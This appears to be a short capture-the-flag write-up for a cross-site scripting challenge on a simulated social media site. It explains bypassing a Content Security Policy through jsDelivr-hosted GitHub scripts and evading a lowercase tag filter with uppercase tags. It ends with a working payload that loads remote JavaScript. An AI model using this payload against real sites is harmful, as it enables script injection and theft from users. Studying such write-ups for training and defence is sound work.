# Solution
# Author : [Shlok](https://github.com/pphreak-1001)
## Challenge Overview

This challenge involves a social media platform where users can:
- Create accounts and profiles
- Post content and images
- Add friends and interact with posts
- Report suspicious content to administrators

The vulnerable endpoint was the posts report feature. 

## Vulnerabilities
1. **CSP Bypass**: 
   - CSP allows scripts from `https://cdn.jsdelivr.net`
   - jsDelivr can serve scripts from GitHub repositories
   - Use: `https://cdn.jsdelivr.net/gh/username/repo@branch/file.js`

2. **Tag Blacklist Bypass**:
   - Filter blocks lowercase tags like `<script>`
   - **Solution**: Use uppercase tags like `<SCRIPT>` to bypass


##Final Payload:
<SCRIPT src="https://cdn.jsdelivr.net/gh/YOUR_USERNAME/YOUR_REPO@main/exploit.js"></SCRIPT>
